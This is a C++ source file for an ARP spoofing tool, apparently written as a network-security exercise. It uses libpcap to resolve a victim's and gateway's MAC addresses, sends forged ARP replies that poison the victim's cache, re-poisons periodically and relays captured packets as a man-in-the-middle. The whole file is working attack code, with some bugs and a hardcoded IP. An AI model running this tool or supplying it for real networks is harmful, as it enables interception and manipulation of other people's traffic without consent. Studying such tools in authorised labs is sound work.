#include <cstdio>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/socket.h>
#include <cstring>
#include "ethhdr.h"
#include "arphdr.h"
#include "mac.h"

#define BUFSIZE 8192

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

typedef struct Mac_add{
	uint8_t addr[6];
} s_Mac_Add;

// Attacker Mac Address - my mac address
s_Mac_Add getMacAddress(char* interface) {
	int sock = socket(AF_INET, SOCK_DGRAM, 0);
	if (sock == -1) {
		perror("socket");
		exit(1);
	}

	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);

	if (ioctl(sock, SIOCGIFHWADDR, &ifr) == -1) {
		perror("ioctl");
		close(sock);
		exit(1);
	}

	close(sock);

	s_Mac_Add mac;
	memcpy(mac.addr, ifr.ifr_hwaddr.sa_data, Mac::SIZE);
	return mac;
}

int send_arp_packet(pcap_t* handle, EthArpPacket* packet, char *dmac, char *smac, char *s_ip, char *tmac, char *t_ip, int opt) {
	packet->eth_.dmac_ = Mac(dmac);
	packet->eth_.smac_ = Mac(smac);
	packet->eth_.type_ = htons(EthHdr::Arp);

	packet->arp_.hrd_ = htons(ArpHdr::ETHER);
	packet->arp_.pro_ = htons(EthHdr::Ip4);
	packet->arp_.hln_ = Mac::SIZE;
	packet->arp_.pln_ = Ip::SIZE;
	if (opt == 1) 
		packet->arp_.op_ = htons(ArpHdr::Reply);
	else 
		packet->arp_.op_ = htons(ArpHdr::Request);
	packet->arp_.smac_ = Mac(smac);
	packet->arp_.sip_ = htonl(Ip(s_ip));
	packet->arp_.tmac_ = Mac(tmac);
	packet->arp_.tip_ = htonl(Ip(t_ip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return -1;
	}
	return 0;
}

Mac get_mac_ARP(pcap_t* handle, EthArpPacket* packet, char *dmac, char *smac, char *s_ip, char *t_ip) {
	//s_Mac_Add mac;
	
	send_arp_packet(handle, packet, dmac, smac, s_ip, "00:00:00:00:00:00", t_ip, 0);
	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet_data;

		int res = pcap_next_ex(handle, &header, &packet_data);
		if (res == 0) continue; // Timeout expired
		if (res == -1 || res == -2) {
			fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		EthArpPacket* sender_packet = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(packet_data));
		if (sender_packet->arp_.sip_ == packet->arp_.tip_ && sender_packet->eth_.type_ == htons(EthHdr::Arp) && sender_packet->arp_.op_ == htons(ArpHdr::Reply)) {
			Mac sender_mac = sender_packet->arp_.smac_;
			printf("Sender's MAC address: %s\n", (char*)std::string(sender_mac).c_str());

			return sender_mac;
		}
	}

	return 0;
}

int main(int argc, char* argv[]) {
	if (argc / 2 != 0 && argc < 4) {
		usage();
		return -1;
	}

	s_Mac_Add atkr_mac = getMacAddress(argv[1]);
	char attacker_mac[18] = "";
	sprintf(attacker_mac, "%02x:%02x:%02x:%02x:%02x:%02x", atkr_mac.addr[0], atkr_mac.addr[1], atkr_mac.addr[2], atkr_mac.addr[3], atkr_mac.addr[4], atkr_mac.addr[5]);

	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t* handle = pcap_open_live(argv[1], BUFSIZE, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", argv[1], errbuf);
		return -1;
	}

	EthArpPacket packet;	

	for (int i = 1; i < argc / 2; i++) {
		char *sender_ip = argv[2 * i];
		char *target_ip = argv[2 * i + 1];
		
		Mac sender_mac = get_mac_ARP(handle, &packet, "FF:FF:FF:FF:FF:FF", attacker_mac, "192.168.193.168", sender_ip);
		Mac target_mac = get_mac_ARP(handle, &packet, "FF:FF:FF:FF:FF:FF", attacker_mac, "192.168.193.168", target_ip);

		// std::string sender = std::string(sender_mac).c_str();
		std::string sender = static_cast<std::string>(sender_mac);
		std::string target = static_cast<std::string>(target_mac);
				
		printf("sender mac : %s\n", (char*)sender.c_str());
		printf("target mac : %s\n", (char*)target.c_str());

		// trick Sender [ target ip -> attacker ip ]
		send_arp_packet(handle, &packet, (char *)sender.c_str(), attacker_mac, target_ip, (char *)sender.c_str(), sender_ip, 1);
		printf("sender tricked\n");

		// Arp spoof
		while (true) {
			int option = 0;
			
			// Trick periodically
			send_arp_packet(handle, &packet, (char *)sender.c_str(), attacker_mac, target_ip, (char *)sender.c_str(), sender_ip, 1);
		
			struct pcap_pkthdr* header;
			const u_char* packet_data;

			int res = pcap_next_ex(handle, &header, &packet_data);
			if (res == 0) continue; // Timeout expired
			if (res == -1 || res == -2) {
				fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				continue;
			}

			//sender = 192.168.254.26
			//attacker = 192.168.254.168
			//gateway = 192.168.254.74
			EthArpPacket* receive_packet = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(packet_data));

			if (receive_packet->arp_.sip_ == Ip(htons(Ip(sender_ip)) | (htons(Ip(sender_ip) >> 16) << 16))) {
				// Trick periodically
				send_arp_packet(handle, &packet, (char *)sender.c_str(), attacker_mac, target_ip, (char *)sender.c_str(), sender_ip, 1);
				printf("capture - sender packet!!\n");

				//relay
				if (receive_packet->arp_.op_ == htons(ArpHdr::Reply))
					option = 1;
				send_arp_packet(handle, receive_packet, (char *)target.c_str(), attacker_mac, sender_ip, (char *)target.c_str(), target_ip, option);
				printf("Relay - Attacker to Target\n");
				
				break;
			}
		}

	}

	pcap_close(handle);
}
